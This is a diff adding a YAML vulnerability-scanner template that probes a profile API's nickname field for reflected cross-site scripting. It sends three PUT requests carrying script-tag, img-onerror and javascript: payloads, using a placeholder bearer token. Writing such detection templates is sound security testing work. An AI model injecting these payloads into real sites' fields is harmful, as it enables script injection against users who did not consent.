@@ -1,0 +1,87 @@
+id: vuln-sns-profile-xss-reflected
+
+info:
+  name: vuln-sns Profile Reflected XSS
+  author: devin
+  severity: medium
+  description: Reflected XSS vulnerability in profile nickname field
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-79
+  metadata:
+    max-request: 3
+  tags: xss,reflected,profile,vuln-sns,authenticated
+
+http:
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/profile"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer alice_token"
+    
+    body: |
+      {
+        "nickname": "<script>alert('XSS')</script>"
+      }
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<script>alert('XSS')</script>"
+        part: body
+      
+      - type: status
+        status:
+          - 200
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/profile"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer alice_token"
+    
+    body: |
+      {
+        "nickname": "\"><img src=x onerror=alert('XSS')>"
+      }
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "onerror=alert"
+        part: body
+      
+      - type: status
+        status:
+          - 200
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/profile"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer alice_token"
+    
+    body: |
+      {
+        "nickname": "javascript:alert('XSS')"
+      }
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "javascript:alert"
+        part: body
+      
+      - type: status
+        status:
+          - 200
